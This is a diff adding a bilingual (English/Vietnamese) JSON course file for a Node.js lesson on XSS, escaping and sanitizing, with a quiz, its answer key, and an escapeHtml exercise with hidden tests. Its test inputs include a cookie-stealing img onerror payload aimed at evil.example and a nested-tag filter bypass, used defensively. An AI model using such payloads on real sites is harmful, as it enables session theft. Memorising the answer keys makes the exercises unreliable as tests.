@@ -1,0 +1,815 @@
+{
+  "trackSlug": "nodejs-practice",
+  "moduleSlug": "nodejs-9-2-xss-va-sanitize",
+  "lesson": {
+    "course": "nodejs",
+    "slug": "nodejs-9-2-xss-va-sanitize"
+  },
+  "exercises": [
+    {
+      "title": "XSS: what the script can do, and what really stops it",
+      "language": "text",
+      "difficulty": "EASY",
+      "estimatedMinutes": 10,
+      "points": 10,
+      "concepts": [
+        "XSS"
+      ],
+      "prerequisites": [],
+      "tags": [
+        "nodejs"
+      ],
+      "problemHtml": "<p>The lesson ran a stored XSS end to end: an attacker’s note in the Notes feed, a victim with a session cookie, four runs changing one thing at a time, then nine payloads through five strategies. Answer from those measurements.</p><p><i>This set has 5 questions. There is nothing to run: answer in the panel on the right and press Submit. Work each one out yourself first (on paper or in the lab), then check — every explanation after Submit says why the tempting wrong answer is wrong.</i></p>\n<h4>Requirements</h4>\n<ul>\n  <li>Answer every question in the answer panel, then press <b>Submit</b>.</li>\n  <li>All answers must be correct to get <b>Accepted</b>; the explanation of every question appears after you submit.</li>\n</ul>",
+      "problemHtmlVi": "<p>Bài chạy một stored XSS từ đầu tới cuối: ghi chú của kẻ tấn công trong bảng tin Notes, nạn nhân có cookie phiên, bốn lượt đổi từng thứ một, rồi chín payload qua năm chiến lược. Trả lời theo các số đo đó.</p><p><i>Bộ này có 5 câu. Không có gì để chạy: trả lời trong khung bên phải rồi bấm Nộp. Hãy tự giải trước (ra giấy hoặc chạy trong phòng lab) rồi mới kiểm — giải thích sau khi Nộp nói rõ vì sao phương án \"trông đúng\" lại sai.</i></p>\n<h4>Yêu cầu</h4>\n<ul>\n  <li>Trả lời mọi câu trong khung trả lời rồi bấm <b>Nộp</b>.</li>\n  <li>Đúng hết mới được <b>Accepted</b>; giải thích từng câu hiện sau khi nộp.</li>\n</ul>",
+      "inputSpec": null,
+      "outputSpec": null,
+      "constraints": "",
+      "examplesJson": [
+        {
+          "input": "Question → choose / fill",
+          "output": "Correct / Incorrect + explanation after Submit|||Đúng / Sai + giải thích sau khi Nộp",
+          "explanation": "Each question (or table cell) is one check.|||Mỗi câu (hoặc ô) là một kiểm."
+        }
+      ],
+      "hintsJson": [
+        "Ask \"did a &lt;script&gt; element end up in the DOM?\" — that is the only thing that matters.|||Hỏi \"có phần tử &lt;script&gt; nào vào DOM không?\" — đó là điều duy nhất quan trọng.",
+        "Run the filter on paper: find the first <code>&lt;script&gt;</code>, the first <code>&lt;/script&gt;</code> after it, delete that span, read what is left.|||Chạy bộ lọc trên giấy: tìm <code>&lt;script&gt;</code> đầu tiên, <code>&lt;/script&gt;</code> đầu tiên sau nó, xoá đoạn đó, đọc phần còn lại."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "answers.md",
+          "language": "text",
+          "code": "# XSS: what the script can do, and what really stops it\n\nAnswer in the answer panel (no code needed).\n\n1. The session cookie is httpOnly. The stored note contains <script> that does POST /notes/delete-all. What happened in run 4?Cookie phiên là httpOnly. Ghi chú chứa <script> gọi POST /notes/delete-all. Lượt 4 ra sao?\n2. The home-made filter s.replace(/<script.*?>.*?<\\/script>/gi, '') receives <scr<script>ipt>alert(1)</scr</script>ipt>. What comes out?Bộ lọc tự chế s.replace(/<script.*?>.*?<\\/script>/gi, '') nhận <scr<script>ipt>alert(1)</scr</script>ipt>. Ra cái gì?\n3. A field is a display name — plain text, no formatting. What is the right defence?Một trường là tên hiển thị — chữ thường, không định dạng. Cách phòng đúng là gì?\n4. Why does the lesson prefer sanitizing on READ (at render) over sanitizing once on write?Vì sao bài chọn sanitize lúc ĐỌC (khi render) hơn là một lần lúc ghi?\n5. Which of these re-open an XSS after you \"fixed\" it? (choose all)Cái nào mở lại XSS sau khi bạn đã \"sửa\"? (chọn mọi câu đúng)\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "answers.md",
+          "language": "text",
+          "code": "# XSS: what the script can do, and what really stops it — answer key\n\n1. The session cookie is httpOnly. The stored note contains <script> that does POST /notes/delete-all. What happened in run 4?Cookie phiên là httpOnly. Ghi chú chứa <script> gọi POST /notes/delete-all. Lượt 4 ra sao?\n   Answer: a) The endpoint was called once and the data was gone: the browser attached the cookie by itself\n   httpOnly only stops document.cookie from reading the token. The script runs inside the victim’s session and every same-origin request carries the cookie. It reduces the blast radius; it does not contain an XSS.VI: httpOnly chỉ chặn document.cookie đọc token. Script chạy TRONG phiên của nạn nhân và mọi request cùng nguồn đều mang cookie. Nó thu nhỏ thiệt hại, không chặn được XSS.\n\n2. The home-made filter s.replace(/<script.*?>.*?<\\/script>/gi, '') receives <scr<script>ipt>alert(1)</scr</script>ipt>. What comes out?Bộ lọc tự chế s.replace(/<script.*?>.*?<\\/script>/gi, '') nhận <scr<script>ipt>alert(1)</scr</script>ipt>. Ra cái gì?\n   Answer: b) <script> — removing the inner tag joins the halves into a working one\n   A single-pass replace on nested input produces exactly what it was written to remove (verified on Node 22: the output is the string <script>). \"I wrote a filter\" is a red flag.VI: Một lần replace trên dữ liệu lồng nhau tạo ra đúng thứ nó định xoá (kiểm trên Node 22: kết quả là chuỗi <script>). \"Tôi đã viết bộ lọc\" là dấu hiệu nguy hiểm.\n\n3. A field is a display name — plain text, no formatting. What is the right defence?Một trường là tên hiển thị — chữ thường, không định dạng. Cách phòng đúng là gì?\n   Answer: b) Escape it (or let React’s {value} / a template’s {{ }} escape it)\n   Plain text ⇒ escape; you cannot get XSS that way. Sanitizing is for fields that must carry formatting (rich text, rendered markdown).VI: Chữ thường ⇒ escape; theo cách này không thể dính XSS. Sanitize dành cho trường buộc phải mang định dạng (rich text, markdown đã render).\n\n4. Why does the lesson prefer sanitizing on READ (at render) over sanitizing once on write?Vì sao bài chọn sanitize lúc ĐỌC (khi render) hơn là một lần lúc ghi?\n   Answer: d) Bypasses are found after data is stored; a patched library then protects old rows too\n   On write is cheaper but the rules of that day are frozen into the column forever. On read costs CPU per render, but next month’s DOMPurify fix applies retroactively.VI: Lúc ghi rẻ hơn nhưng luật của hôm đó bị đóng băng vào cột mãi mãi. Lúc đọc tốn CPU mỗi lần render, nhưng bản vá DOMPurify tháng sau áp dụng cả cho dữ liệu cũ.\n\n5. Which of these re-open an XSS after you \"fixed\" it? (choose all)Cái nào mở lại XSS sau khi bạn đã \"sửa\"? (chọn mọi câu đúng)\n   Answer: a) Building an href from user data by string concatenation + b) Rendering markdown and trusting it to drop raw HTML + d) element.innerHTML = data somewhere in client code + e) Embedding <script>window.__DATA__ = {...}</script> with a value containing </script>\n   The four ways it comes back, from the lesson. React’s {value} escapes by default, so it is the safe one; dangerouslySetInnerHTML is the one that is not.VI: Bốn cách nó quay lại, từ bài. {value} của React tự escape nên là cách an toàn; dangerouslySetInnerHTML mới là cái không an toàn.\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p><b>Answer key / Đáp án</b></p><ol><li><p><b>a)</b> The endpoint was called once and the data was gone: the browser attached the cookie by itself</p><p>httpOnly only stops document.cookie from reading the token. The script runs inside the victim’s session and every same-origin request carries the cookie. It reduces the blast radius; it does not contain an XSS.</p><p><i>VI: httpOnly chỉ chặn document.cookie đọc token. Script chạy TRONG phiên của nạn nhân và mọi request cùng nguồn đều mang cookie. Nó thu nhỏ thiệt hại, không chặn được XSS.</i></p></li><li><p><b>b)</b> <code>&lt;script&gt;</code> — removing the inner tag joins the halves into a working one</p><p>A single-pass replace on nested input produces exactly what it was written to remove (verified on Node 22: the output is the string &lt;script&gt;). \"I wrote a filter\" is a red flag.</p><p><i>VI: Một lần replace trên dữ liệu lồng nhau tạo ra đúng thứ nó định xoá (kiểm trên Node 22: kết quả là chuỗi &lt;script&gt;). \"Tôi đã viết bộ lọc\" là dấu hiệu nguy hiểm.</i></p></li><li><p><b>b)</b> Escape it (or let React’s {value} / a template’s {{ }} escape it)</p><p>Plain text ⇒ escape; you cannot get XSS that way. Sanitizing is for fields that must carry formatting (rich text, rendered markdown).</p><p><i>VI: Chữ thường ⇒ escape; theo cách này không thể dính XSS. Sanitize dành cho trường buộc phải mang định dạng (rich text, markdown đã render).</i></p></li><li><p><b>d)</b> Bypasses are found after data is stored; a patched library then protects old rows too</p><p>On write is cheaper but the rules of that day are frozen into the column forever. On read costs CPU per render, but next month’s DOMPurify fix applies retroactively.</p><p><i>VI: Lúc ghi rẻ hơn nhưng luật của hôm đó bị đóng băng vào cột mãi mãi. Lúc đọc tốn CPU mỗi lần render, nhưng bản vá DOMPurify tháng sau áp dụng cả cho dữ liệu cũ.</i></p></li><li><p><b>a)</b> Building an <code>href</code> from user data by string concatenation + <b>b)</b> Rendering markdown and trusting it to drop raw HTML + <b>d)</b> <code>element.innerHTML = data</code> somewhere in client code + <b>e)</b> Embedding <code>&lt;script&gt;window.__DATA__ = {...}&lt;/script&gt;</code> with a value containing <code>&lt;/script&gt;</code></p><p>The four ways it comes back, from the lesson. React’s {value} escapes by default, so it is the safe one; dangerouslySetInnerHTML is the one that is not.</p><p><i>VI: Bốn cách nó quay lại, từ bài. {value} của React tự escape nên là cách an toàn; dangerouslySetInnerHTML mới là cái không an toàn.</i></p></li></ol>",
+      "solutionExplanationHtmlVi": null,
+      "diagramMermaid": null,
+      "referenceUrl": null,
+      "testsJson": {
+        "loai": "choice",
+        "cauHoi": [
+          {
+            "ma": "x1",
+            "de": "<p>The session cookie is <code>httpOnly</code>. The stored note contains <code>&lt;script&gt;</code> that does <code>POST /notes/delete-all</code>. What happened in run 4?</p><p style=\"opacity:.75;font-size:.92em\"><i>Cookie phiên là <code>httpOnly</code>. Ghi chú chứa <code>&lt;script&gt;</code> gọi <code>POST /notes/delete-all</code>. Lượt 4 ra sao?</i></p>",
+            "luaChon": [
+              {
+                "ma": "a",
+                "noiDung": "The endpoint was called once and the data was gone: the browser attached the cookie by itself"
+              },
+              {
+                "ma": "b",
+                "noiDung": "The script could not run because httpOnly also disables inline scripts"
+              },
+              {
+                "ma": "c",
+                "noiDung": "Nothing: httpOnly cookies are not sent on requests made by scripts"
+              },
+              {
+                "ma": "d",
+                "noiDung": "The request was blocked by CORS because it came from a script"
+              }
+            ],
+            "dapAn": [
+              "a"
+            ],
+            "giaiThich": "<p>httpOnly only stops document.cookie from reading the token. The script runs inside the victim’s session and every same-origin request carries the cookie. It reduces the blast radius; it does not contain an XSS.</p><p><i>VI: httpOnly chỉ chặn document.cookie đọc token. Script chạy TRONG phiên của nạn nhân và mọi request cùng nguồn đều mang cookie. Nó thu nhỏ thiệt hại, không chặn được XSS.</i></p>"
+          },
+          {
+            "ma": "x2",
+            "de": "<p>The home-made filter <code>s.replace(/&lt;script.*?&gt;.*?&lt;\\/script&gt;/gi, '')</code> receives <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>. What comes out?</p><p style=\"opacity:.75;font-size:.92em\"><i>Bộ lọc tự chế <code>s.replace(/&lt;script.*?&gt;.*?&lt;\\/script&gt;/gi, '')</code> nhận <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>. Ra cái gì?</i></p>",
+            "luaChon": [
+              {
+                "ma": "a",
+                "noiDung": "An empty string — the global flag removes every script tag"
+              },
+              {
+                "ma": "b",
+                "noiDung": "<code>&lt;script&gt;</code> — removing the inner tag joins the halves into a working one"
+              },
+              {
+                "ma": "c",
+                "noiDung": "<code>alert(1)</code> as plain text — the tags are gone, the body stays"
+              },
+              {
+                "ma": "d",
+                "noiDung": "The input unchanged — the outer tag is not a valid script tag"
+              }
+            ],
+            "dapAn": [
+              "b"
+            ],
+            "giaiThich": "<p>A single-pass replace on nested input produces exactly what it was written to remove (verified on Node 22: the output is the string &lt;script&gt;). \"I wrote a filter\" is a red flag.</p><p><i>VI: Một lần replace trên dữ liệu lồng nhau tạo ra đúng thứ nó định xoá (kiểm trên Node 22: kết quả là chuỗi &lt;script&gt;). \"Tôi đã viết bộ lọc\" là dấu hiệu nguy hiểm.</i></p>"
+          },
+          {
+            "ma": "x3",
+            "de": "<p>A field is a display name — plain text, no formatting. What is the right defence?</p><p style=\"opacity:.75;font-size:.92em\"><i>Một trường là tên hiển thị — chữ thường, không định dạng. Cách phòng đúng là gì?</i></p>",
+            "luaChon": [
+              {
+                "ma": "a",
+                "noiDung": "Run it through DOMPurify on every render"
+              },
+              {
+                "ma": "b",
+                "noiDung": "Escape it (or let React’s {value} / a template’s {{ }} escape it)"
+              },
+              {
+                "ma": "c",
+                "noiDung": "Strip &lt;script&gt; with a regex before saving"
+              },
+              {
+                "ma": "d",
+                "noiDung": "Store it base64-encoded so the browser cannot parse it"
+              }
+            ],
+            "dapAn": [
+              "b"
+            ],
+            "giaiThich": "<p>Plain text ⇒ escape; you cannot get XSS that way. Sanitizing is for fields that must carry formatting (rich text, rendered markdown).</p><p><i>VI: Chữ thường ⇒ escape; theo cách này không thể dính XSS. Sanitize dành cho trường buộc phải mang định dạng (rich text, markdown đã render).</i></p>"
+          },
+          {
+            "ma": "x4",
+            "de": "<p>Why does the lesson prefer sanitizing on READ (at render) over sanitizing once on write?</p><p style=\"opacity:.75;font-size:.92em\"><i>Vì sao bài chọn sanitize lúc ĐỌC (khi render) hơn là một lần lúc ghi?</i></p>",
+            "luaChon": [
+              {
+                "ma": "a",
+                "noiDung": "Rows sanitized on write cannot be searched with full-text indexes"
+              },
+              {
+                "ma": "b",
+                "noiDung": "Sanitizing on write is impossible because the database escapes HTML automatically"
+              },
+              {
+                "ma": "c",
+                "noiDung": "Reading is cheaper: DOMPurify costs 0.2 ms on read and 12 ms on write"
+              },
+              {
+                "ma": "d",
+                "noiDung": "Bypasses are found after data is stored; a patched library then protects old rows too"
+              }
+            ],
+            "dapAn": [
+              "d"
+            ],
+            "giaiThich": "<p>On write is cheaper but the rules of that day are frozen into the column forever. On read costs CPU per render, but next month’s DOMPurify fix applies retroactively.</p><p><i>VI: Lúc ghi rẻ hơn nhưng luật của hôm đó bị đóng băng vào cột mãi mãi. Lúc đọc tốn CPU mỗi lần render, nhưng bản vá DOMPurify tháng sau áp dụng cả cho dữ liệu cũ.</i></p>"
+          },
+          {
+            "ma": "x5",
+            "de": "<p>Which of these re-open an XSS after you \"fixed\" it? (choose all)</p><p style=\"opacity:.75;font-size:.92em\"><i>Cái nào mở lại XSS sau khi bạn đã \"sửa\"? (chọn mọi câu đúng)</i></p>",
+            "luaChon": [
+              {
+                "ma": "a",
+                "noiDung": "Building an <code>href</code> from user data by string concatenation"
+              },
+              {
+                "ma": "b",
+                "noiDung": "Rendering markdown and trusting it to drop raw HTML"
+              },
+              {
+                "ma": "c",
+                "noiDung": "Rendering the value with React’s <code>{value}</code>"
+              },
+              {
+                "ma": "d",
+                "noiDung": "<code>element.innerHTML = data</code> somewhere in client code"
+              },
+              {
+                "ma": "e",
+                "noiDung": "Embedding <code>&lt;script&gt;window.__DATA__ = {...}&lt;/script&gt;</code> with a value containing <code>&lt;/script&gt;</code>"
+              }
+            ],
+            "dapAn": [
+              [
+                "a",
+                "b",
+                "d",
+                "e"
+              ]
+            ],
+            "nhieu": true,
+            "giaiThich": "<p>The four ways it comes back, from the lesson. React’s {value} escapes by default, so it is the safe one; dangerouslySetInnerHTML is the one that is not.</p><p><i>VI: Bốn cách nó quay lại, từ bài. {value} của React tự escape nên là cách an toàn; dangerouslySetInnerHTML mới là cái không an toàn.</i></p>"
+          }
+        ]
+      },
+      "gradeKind": "choice",
+      "kind": "practice",
+      "mistakesJson": [
+        {
+          "loi": "\"Our cookie is httpOnly, so XSS cannot hurt us.\"|||\"Cookie của ta là httpOnly nên XSS không làm gì được.\""
+        },
+        {
+          "loi": "Writing a regex that \"strips the dangerous bits\" — HTML is not a regular language.|||Viết regex \"lọc phần nguy hiểm\" — HTML không phải ngôn ngữ chính quy."
+        }
+      ],
+      "glossaryJson": [
+        {
+          "en": "stored XSS",
+          "vi": "XSS lưu trữ",
+          "giaiThich": "payload nằm trong DB, nổ với mọi người xem"
+        },
+        {
+          "en": "escape",
+          "vi": "thoát ký tự",
+          "giaiThich": "< thành &lt; — dữ liệu hiện ra như chữ"
+        },
+        {
+          "en": "sanitize",
+          "vi": "làm sạch",
+          "giaiThich": "giữ thẻ mang nghĩa, bỏ thẻ/thuộc tính mang hành vi"
+        }
+      ]
+    },
+    {
+      "title": "Escape a note before it reaches the page",
+      "language": "javascript",
+      "difficulty": "EASY",
+      "estimatedMinutes": 8,
+      "points": 10,
+      "concepts": [
+        "XSS",
+        "escaping"
+      ],
+      "prerequisites": [],
+      "tags": [
+        "nodejs"
+      ],
+      "problemHtml": "<p>The Notes feed renders <code>note.body</code> into HTML. The lesson’s strategy for plain-text fields is to <b>escape</b>. Write <code>escapeHtml(value)</code>:</p>\n<ul><li>convert <code>value</code> to a string first (<code>String(value)</code>);</li>\n<li>replace <code>&amp;</code> → <code>&amp;amp;</code>, <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>\"</code> → <code>&amp;quot;</code>, <code>'</code> → <code>&amp;#39;</code> — every occurrence.</li></ul>\n<p>The payload <code>&lt;img src=x onerror=\"fetch(…)\"&gt;</code> must come out as text the browser shows, not a tag it runs.</p><p><i>Graded in your browser: there is no real Express, network, Buffer or <code>crypto</code> here. The tests call your function with small fake objects (a fake <code>res</code> that records <code>status()</code>, headers and <code>json()</code>; fake stores with async methods), exactly the way Chapter 14 tests a handler without a server. <code>Date.now()</code> and timers run on a virtual clock, so waiting costs no real time.</i></p>\n<h4>Requirements</h4>\n<ul>\n  <li>Return the value; do not print it.</li>\n  <li>Do not modify the arguments.</li>\n</ul>",
+      "problemHtmlVi": "<p>Bảng tin Notes render <code>note.body</code> vào HTML. Chiến lược của bài cho trường chữ thường là <b>escape</b>. Viết <code>escapeHtml(value)</code>:</p>\n<ul><li>đổi <code>value</code> thành chuỗi trước (<code>String(value)</code>);</li>\n<li>thay <code>&amp;</code> → <code>&amp;amp;</code>, <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>\"</code> → <code>&amp;quot;</code>, <code>'</code> → <code>&amp;#39;</code> — mọi lần xuất hiện.</li></ul>\n<p>Payload <code>&lt;img src=x onerror=\"fetch(…)\"&gt;</code> phải ra thành chữ trình duyệt hiển thị, không phải thẻ nó chạy.</p><p><i>Chấm ngay trong trình duyệt: ở đây không có Express thật, mạng, Buffer hay <code>crypto</code>. Bộ kiểm gọi hàm của bạn với các object GIẢ nhỏ (một <code>res</code> giả ghi lại <code>status()</code>, header và <code>json()</code>; kho giả có hàm async), đúng cách Chương 14 kiểm một handler mà không cần máy chủ. <code>Date.now()</code> và hẹn giờ chạy trên đồng hồ ẢO nên chờ không tốn thời gian thật.</i></p>\n<h4>Yêu cầu</h4>\n<ul>\n  <li>Trả về giá trị, đừng in ra.</li>\n  <li>Không sửa các đối số.</li>\n</ul>",
+      "inputSpec": null,
+      "outputSpec": null,
+      "constraints": "",
+      "examplesJson": [
+        {
+          "input": "escapeHtml('<img src=x onerror=\"fetch(\\'https://evil.example/?c=\\'+document.cookie)\">')",
+          "output": "\"&lt;img src=x onerror=&quot;fetch(&#39;https://evil.example/?c=&#39;+document.cookie)&quot;&gt;\"",
+          "explanation": "The first sample case (more cases run when you press Run; hidden ones only on Submit).|||Ca mẫu đầu tiên (Chạy thử chạy thêm các ca hiện; ca ẩn chỉ chạy khi Nộp)."
+        }
+      ],
+      "hintsJson": [
+        "Five <code>.replace(/x/g, …)</code> calls chained — the <code>g</code> flag is what replaces every occurrence.|||Năm lời gọi <code>.replace(/x/g, …)</code> nối nhau — cờ <code>g</code> mới thay mọi lần xuất hiện.",
+        "Order matters: which replacement produces a character that another replacement would touch again?|||Thứ tự quan trọng: phép thay nào sinh ra ký tự mà phép thay khác sẽ đụng lại?"
+      ],
+      "starterCodeJson": [
+        {
+          "name": "answer.js",
+          "language": "javascript",
+          "code": "/** Escape a value so it renders as text inside HTML. */\nfunction escapeHtml(value) {\n  // Write your solution here\n  return String(value).replace('<', '&lt;').replace('>', '&gt;');\n}\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "answer.js",
+          "language": "javascript",
+          "code": "// Reference solution\nfunction escapeHtml(value) {\n  // Anything can reach a template (numbers, null…): turn it into a string first.\n  return String(value)\n    // & MUST go first: otherwise the \"&\" inside \"&lt;\" we just produced would be escaped again into \"&amp;lt;\".\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')    // no new tags can start\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')  // cannot break out of attr=\"…\"\n    .replace(/'/g, '&#39;');  // cannot break out of attr='…'\n}\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p>Escaping turns every character that has meaning in HTML into an entity, so the parser can only produce text. <code>&amp;</code> goes first because it is the only replacement whose output contains a character from the list. Quotes are escaped so the same function is safe inside attribute values too. This is what React’s <code>{value}</code> does for you.</p>",
+      "solutionExplanationHtmlVi": "<p>Escape biến mọi ký tự có nghĩa trong HTML thành thực thể, nên bộ phân tích chỉ có thể tạo ra chữ. <code>&amp;</code> đi trước vì nó là phép thay duy nhất mà kết quả chứa một ký tự trong danh sách. Dấu nháy được escape để cùng hàm này an toàn cả trong giá trị thuộc tính. Đây là điều <code>{value}</code> của React làm cho bạn.</p>",
+      "diagramMermaid": null,
+      "referenceUrl": null,
+      "testsJson": {
+        "loai": "js",
+        "phienBan": 1,
+        "tepChinh": "answer.js",
+        "tepNap": [
+          "answer.js"
+        ],
+        "kiem": [
+          {
+            "moTa": {
+              "en": "The img onerror payload",
+              "vi": "Payload img onerror"
+            },
+            "goi": "escapeHtml('<img src=x onerror=\"fetch(\\'https://evil.example/?c=\\'+document.cookie)\">')",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "&lt;img src=x onerror=&quot;fetch(&#39;https://evil.example/?c=&#39;+document.cookie)&quot;&gt;"
+          },
+          {
+            "moTa": {
+              "en": "Every tag, not only the first",
+              "vi": "Mọi thẻ, không chỉ thẻ đầu"
+            },
+            "goi": "escapeHtml('<b>bold</b> & <i>it</i>')",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "&lt;b&gt;bold&lt;/b&gt; &amp; &lt;i&gt;it&lt;/i&gt;"
+          },
+          {
+            "moTa": {
+              "en": "A plain ampersand",
+              "vi": "Một dấu & thường"
+            },
+            "goi": "escapeHtml('Tom & Jerry')",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "Tom &amp; Jerry"
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 4",
+              "vi": "Ca ẩn 4"
+            },
+            "goi": "escapeHtml('&lt;already&gt;')",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = 